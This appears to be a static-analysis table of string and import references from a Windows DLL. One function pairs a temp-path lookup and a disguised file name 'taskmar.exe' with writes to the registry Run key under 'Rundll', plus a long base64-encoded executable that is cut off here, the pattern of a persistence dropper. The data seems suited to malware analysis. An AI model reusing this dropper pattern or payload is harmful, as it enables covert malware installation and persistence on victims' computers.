reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x100012bd	0x1013aef4	string	0x10001040	string too long
0x10001457	0x1013aef4	string	0x10001400	string too long
0x100014df	0x1013aef4	string	0x100014d0	string too long
0x10001591	0x1013af04	string	0x10001580	invalid string position
0x100015c8	0x1013aef4	string	0x10001580	string too long
0x100017da	0x1013af04	string	0x100017d0	invalid string position
0x100018e4	0x10114408	import	0x100018b0	KERNEL32.dll.GetTempPathA
0x100018f8	0x1013af3c	string	0x100018b0	taskmar.exe
0x10001904	0x10114490	import	0x100018b0	SHLWAPI.dll.PathFileExistsA
0x10001936	0x1013af48	string	0x100018b0	SOFTWARE\Microsoft\Windows\CurrentVersion\Run
0x10001940	0x10114004	import	0x100018b0	ADVAPI32.dll.RegOpenKeyExA
0x1000197a	0x1013af78	string	0x100018b0	Rundll
0x1000198b	0x10114008	import	0x100018b0	ADVAPI32.dll.RegGetValueA
0x100019b0	0x1011421c	import	0x100018b0	KERNEL32.dll.lstrlenA
0x100019c5	0x1013af78	string	0x100018b0	Rundll
0x100019cb	0x1011401c	import	0x100018b0	ADVAPI32.dll.RegSetValueExA
0x100019d8	0x1011400c	import	0x100018b0	ADVAPI32.dll.RegCloseKey
0x100019ed	0x10158610	string	0x100018b0	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
